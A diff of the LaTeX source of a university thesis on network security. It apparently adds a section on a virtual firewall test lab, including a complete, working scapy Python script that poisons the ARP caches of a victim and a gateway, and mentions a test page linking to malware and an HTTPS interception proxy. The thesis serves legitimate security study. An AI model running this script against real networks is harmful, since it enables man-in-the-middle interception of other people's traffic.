@@ -9,7 +9,7 @@
 % default elaborato, altri possibili: tesina, tesi, tesiphd, dispensa, libro
 
 \input{model/Modello_tesi}
-
+\setlength{\headheight}{14.5pt}
 %\Author{Marco Martini}
 %\Title{Managing Security of Computer Network Applications using Encryption Techniques}
 %%\Subtitle{tesi}
@@ -38,8 +38,18 @@
 
 % ------- Copertina ---------------
 \begin{titlepage}
+%\includegraphics[height=3cm]{images/logo_left.png}
+%\hspace{3.5cm}
+\begin{figure}
+\begin{subfigure}{0.4\textwidth}
+    \includegraphics[height=2cm]{images/login-logo.png}
+\end{subfigure}
+\hfill
+\begin{subfigure}{0.4\textwidth}
+    \includegraphics[height=2.5cm]{images/logo_left.png}
+\end{subfigure}
+\end{figure}
 \begin{center}
-\includegraphics[scale=0.1]{images/logo.png}\\
 
 %Per il frontespizio del dipartimenti di Ing. dell'Informazione commentare le riga precedente e decommentare la successiva
 %\includegraphics[scale=0.2]{images/logo_unipd.png} \hfill \includegraphics[scale=0.2]{images/logo_dei.png}\\
@@ -62,7 +72,8 @@
 
 \vfill
 % Bottom of the page
-{\large Anno Accademico 2021/2022}
+{\large ANNO ACCADEMICO 2021/2022} \\
+{\large Data di laurea 19/09/2022}
 \end{center}
 \end{titlepage}
 
@@ -309,7 +320,8 @@ It works exactly like an HTTPS server so it also needs its own SSL/TLS certifica
 
 In order to verify the firewall effectiveness a virtual laboratory will be setup.
 
-The virtual laboratory is deployed through Virtual Machines, since the Palo Alto Firewall is very resource intensive the hypervisor of choice has been KVM(source), with libvirt/qemu as the userspace component.
+The virtual laboratory is deployed through Virtual Machines, since the Palo Alto Firewall is very resource intensive the hypervisor of choice has been KVM
+(source), with libvirt/qemu as the userspace component.
 
 Instead of direct access to the Internet the VM clients will connect to the host machine, the host will run NGINX(source) configured with Let's Encrypt(source) certificates as the HTTPS server, it will host a simple web page with a link that points to malware.
 
@@ -321,7 +333,7 @@ Instead of direct access to the Internet the VM clients will connect to the host
  \label{fig: webpage}
 \end{figure}
 
-\begin{verbatim}
+\begin{lstlisting}[language=html]{}
  <html>
     <body>
         <h1>Download virus here:
@@ -331,7 +343,7 @@ Instead of direct access to the Internet the VM clients will connect to the host
         </h1>
     </body>
 </html>
-\end{verbatim}
+\end{lstlisting}
 
 \begin{center}
 The Source Code of the web page
@@ -419,7 +431,7 @@ In order to do that we must generate our self signed certificate, and enable the
  \subfloat[The Certificate Generation Menu in Palo Alto FW\label{Certificate Generation}]{
  \includegraphics[width=6cm]{img/Certificate_generation.png}}
  \hspace{0.5cm}
- \subfloat[The Certificate Settings Menu in Palo Alto FW\label{Certificate Settings}]{\includegraphics[width=6cm]{img/Certificate_settings.png.eps}}
+ \subfloat[The Certificate Settings Menu in Palo Alto FW\label{Certificate Settings}]{\includegraphics[width=6cm]{img/Certificate_settings.png}}
  \caption{SSL/TLS Certificates configuration in PanOS}\label{Certificates}
 \end{figure}
 
@@ -486,9 +498,13 @@ TODO
 
 \section{Setting up the Network Attack}
 
-In order to setup the Network Attack the Open Source penetration testing tool `bettercap` will be used.
+In order to setup the Network Attack the Open Source penetration testing tools `bettercap` and `scapy` will be used.
 
-It's a ``powerful, easily extensible and portable framework written in Go which aims to offer to security researchers, red teamers and reverse engineers an easy to use, all-in-one solution with all the features they might possibly need for performing reconnaissance and attacking WiFi networks, Bluetooth Low Energy devices, wireless HID devices and Ethernet networks.''\cite{bettercap}
+Wireshark, an open source packet analyzer will also be used to verify the effectiveness of the attacks and provide a broader view into what's happening.
+
+\subsection{Bettercap}
+
+Bettercap is a ``powerful, easily extensible and portable framework written in Go which aims to offer to security researchers, red teamers and reverse engineers an easy to use, all-in-one solution with all the features they might possibly need for performing reconnaissance and attacking WiFi networks, Bluetooth Low Energy devices, wireless HID devices and Ethernet networks.''\cite{bettercap}
 
 It has both a GUI interface and a CLI interface, for simplicity the CLI interface will be used.
 
@@ -502,27 +518,124 @@ After launching it we can look at the various features through the \verb|help| c
  \label{fig: bettercap help}
 \end{figure}
 
-Every tool is called a caplet, we'll be using the ``https.proxy'' and ``arp.spoof'' caplets.
+Every tool is called a caplet, we'll be using the ``https.proxy'' caplet to inspect and replace HTTPS traffic.
+
+\newpage
+
+\subsection{Scapy}
+
+Scapy is an all-in-one tool for packet manipulation.
+``It is able to forge or decode packets of a wide number of protocols, send them on the wire, capture them, match requests and replies, and much more. It can easily handle most classical tasks like scanning, tracerouting, probing, unit tests, attacks or network discovery [...]''\cite{scapy}
+
+Since it uses Python as a command board it's also possible to create a Python script to create more advanced attacks.
+
+In our case we'll use it to create the ARP Spoof attack.
+
+\begin{figure}[h!]
+ \centering
+ \includegraphics[width=8cm]{img/testing-taxonomy.png}
+ % bettercap_help.png: 237x492 px, 96dpi, 6.27x13.02 cm, bb=0 0 178 369
+ \caption{Scapy's Taxonomy}
+ \label{fig: scapy taxonomy}
+\end{figure}
+
 
 \newpage
 
 \subsection{Setting up ARP Spoofing}
 
-Once bettercap has been launched, to start ARP spoofing we just need to enter \verb|arp.spoof on| in the console.
+First of all we need to write our python script to make use of scapy.
 
-By default the tool will send a spoofed ARP message with the attacker's IP address associated to the LAN Gateway every second to the entire subnet where the attacker is connected.
+The idea is to forge a malign ARP packet where we tell that the gateway's IP address corresponds the attacker machine and from the gateway (the firewall in this case) point of view the victim is replaced by the attacker instead.
 
-The configurable options are\cite{arp-poof-source-code}:
+Before doing that we also need the gateway and victim's MAC address, so we'll send a broadcast ARP request for both the victim and gateway.
 
-\begin{itemize}
- \item  \verb|arp.spoof.fullduplex| : If true, both the targets and the gateway will be attacked, otherwise only the target (if the router has ARP spoofing protections in place this will make the attack fail). (default=false)
- \item     \verb|arp.spoof.internal |: If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the external network. (default=false)
- \item \verb|arp.spoof.skip\_restore |: If set to true, targets arp cache won't be restored when spoofing is stopped. (default=false)
- \item      \verb|arp.spoof.targets |: Comma separated list of IP addresses, MAC addresses or aliases to spoof, also supports nmap style IP ranges. (default=<entire subnet>)
- \item    \verb|arp.spoof.whitelist |: Comma separated list of IP addresses, MAC addresses or aliases to skip while spoofing. (default=)
-\end{itemize}
+\begin{lstlisting}[language=python]{}
+from scapy.all import *
+import argparse
+import time
 
-The results in the victim are the following:
+# Get arguments from command line
+parser = argparse.ArgumentParser()
+parser.add_argument("--victim", dest="victim", help="Victim's IP Address")
+parser.add_argument("--gateway", dest="gateway", help="Gateway's IP Address")
+options = parser.parse_args()
+victim = options.victim
+gateway = options.gateway
+# Get mac address of the victim and gateway
+# Request victim's mac by sending a Broadcast ARP request
+print("Victim's IP:\t", victim)
+print("Gateways's IP:\t", gateway)
+rqst = ARP(pdst=victim)
+victim_mac = srp((Ether(dst="ff:ff:ff:ff:ff:ff")/rqst), timeout=1, verbose=True)[0][0][1].hwsrc
+# Request gateway's mac by sending a Broadcast ARP request
+rqst = ARP(pdst=gateway)
+gateway_mac = srp((Ether(dst="ff:ff:ff:ff:ff:ff")/rqst), timeout=1, verbose=True)[0][0][1].hwsrc
+print("Victim's mac:\t", victim_mac)
+print("Gateway's mac:\t", gateway_mac)
+
+
+print("-----ARP Spoofing------")
+try:
+    while True:
+        #Sends a packet to the victim that fakes being the gateway
+        #But the mac address comes from this machine
+        packet = ARP(op=2,pdst=victim, hwdst=victim_mac, psrc=gateway)
+        send(packet, count=4, verbose=True)
+        #The same but this time we fake being the victim
+        packet = ARP(op=2,pdst=gateway, hwdst=gateway_mac, psrc=victim)
+        send(packet, count=4, verbose=True)
+        time.sleep(1)
+except KeyboardInterrupt:
+    # When the program is interrupted we restore the ARP table by
+    # sending correct ARP packets by specifying the mac address
+    print("Restoring ARP tables")
+    packet = ARP(op=2,pdst=victim, hwdst=victim_mac, psrc=gateway, hwsrc=gateway_mac)
+    send(packet, count=4, verbose=True)
+    packet = ARP(op=2,pdst=gateway, hwdst=gateway_mac, psrc=victim, hwsrc=victim_mac)
+    send(packet, count=4, verbose=True)
+    print("Done")
+\end{lstlisting}
+
+\begin{center}
+    The Python script used for ARP Spoofing
+\end{center}
+
+
+\newpage
+
+The code can be summarized in this flow diagram:
+
+\begin{figure}[h!]
+ \centering
+ \includegraphics[height=20.5cm]{img/arp_spoof_flow.png}
+ % arp_spoof_flow.png: 1269x2097 px, 72dpi, 44.77x73.98 cm, bb=0 0 1269 2097
+ \caption{ARP Spoofing Flow Diagram}
+ \label{fig: Flow ARP}
+\end{figure}
+
+
+\newpage
+
+Here are some packets captured by Wireshark during the attack:
+
+\begin{figure}[h!]
+ \centering
+ \includegraphics[width=13cm]{img/wireshark_request_mac.png}
+ % wireshark_request_mac.png: 816x55 px, 96dpi, 21.59x1.46 cm, bb=0 0 612 41
+ \caption{ARP Request Packets View: The attacker creates a broadcast ARP request to get the Victim and Gateway's MAC Addresses}
+ \label{fig: ARP Request wireshark}
+\end{figure}
+
+\begin{figure}[h!]
+ \centering
+ \includegraphics[width=13cm]{img/wireshark_arp_spoof.png}
+ % wireshark_arp_spoof.png: 800x114 px, 96dpi, 21.16x3.02 cm, bb=0 0 600 85
+ \caption{ARP Spoof Packets View: The attacker sends an ARP packet containing a spoofed MAC Address for both the gateway and the victim}
+ \label{fig: ARP Spoof Wireshark}
+\end{figure}
+
+After receiving those packets the victim's ARP table will be changed accordingly:
 
 \begin{figure}[!hb]
 \centering
@@ -532,8 +645,6 @@ The results in the victim are the following:
  \subfloat[ARP Table after Spoofing\label{fig: spoof-after}]{\includegraphics[width=7cm]{img/arp_spoof_after.png}}
  \caption{The result of ARP Spoofing/Poisoning}\label{fig: spoof-before-after}
 \end{figure}
-
-\newpage
 
 Since the Gateway now points to the Attacker machine, the traceroute output is also changed:
 
@@ -545,6 +656,8 @@ Since the Gateway now points to the Attacker machine, the traceroute output is a
   \subfloat[Traceroute after ARP Spoof\label{fig: traceroute-after}]{
  \includegraphics[width=7cm]{img/traceroute_after.png}}
 \end{figure}
+
+\newpage
 
 
 \subsection{Setting up the HTTPS Proxy}
